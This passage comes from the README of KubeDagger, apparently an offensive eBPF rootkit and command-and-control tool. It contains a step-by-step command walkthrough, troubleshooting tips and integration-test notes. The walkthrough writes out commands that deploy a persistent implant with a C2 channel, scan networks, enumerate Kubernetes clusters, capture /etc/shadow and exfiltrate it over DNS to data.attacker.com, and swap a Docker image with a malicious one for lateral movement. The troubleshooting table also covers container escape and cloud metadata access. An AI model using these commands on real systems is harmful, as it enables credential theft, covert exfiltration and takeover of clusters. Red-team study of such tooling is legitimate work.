sudo ./bin/kubedagger -i eth0 -e eth0 --persist --c2-port 9001 --c2-key $KEY

# 2. Discover the network
kubedagger-client network_discovery scan --ip 192.168.1.1 --port 1 --range 1024

# 3. If in Kubernetes, enumerate the cluster
kubedagger-client k8s discover -o cluster.json

# 4. Watch sensitive files
kubedagger-client fs_watch add /etc/shadow --active
kubedagger-client fs_watch get /etc/shadow -o shadow.txt

# 5. If HTTP is blocked, exfiltrate via DNS
kubedagger-client dns_exfil --file /etc/shadow --domain data.attacker.com

# 6. Monitor everything in real-time
kubedagger-client dashboard

# 7. Override a Docker image for lateral movement
kubedagger-client docker put --from webapp:v1 --to evil/webapp:v1 --override 1

# 8. Generate MITRE report for documentation
kubedagger-client mitre export --format markdown -o report.md

# 9. View process tree
kubedagger-client proctree get
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| `permission denied` loading eBPF | Run with `sudo` or `CAP_BPF` + `CAP_NET_ADMIN` |
| `kernel headers not found` | Install `linux-headers-$(uname -r)` |
| Client can't connect | Check `--target` URL and ensure server is running |
| Dashboard shows no data | Verify the server is reachable and has active probes |
| DNS exfil not working | Ensure outbound UDP/53 is allowed; try a different `--server` |
| K8s discovery fails | Check service account permissions or kubeconfig path |
| Persistence not surviving | Verify systemd is running or cron is enabled |
| Container escape fails | Verify container is privileged or has required capabilities |
| Cloud meta returns empty | Check IMDS accessibility (some environments block `169.254.169.254`) |

---

## Integration Testing

KubeDagger includes integration tests that load eBPF programs into the kernel and verify correct attachment.

```shell
# Run integration tests (requires root and BTF-enabled kernel)
sudo $(which go) test -tags integration -v -count=1 -timeout 60s ./pkg/kubedagger/
```

The integration tests use build tag `integration` and are separate from unit tests. They verify:
- BPF programs load successfully via the BPF verifier
- All kprobe/uprobe/XDP/TC programs attach to their hooks
- Key BPF maps (`http_routes`, `dns_table`, `piped_progs`, `comm_prog_key`) are accessible

CI runs these automatically on every push using GitHub Actions runners with BTF-enabled kernels.
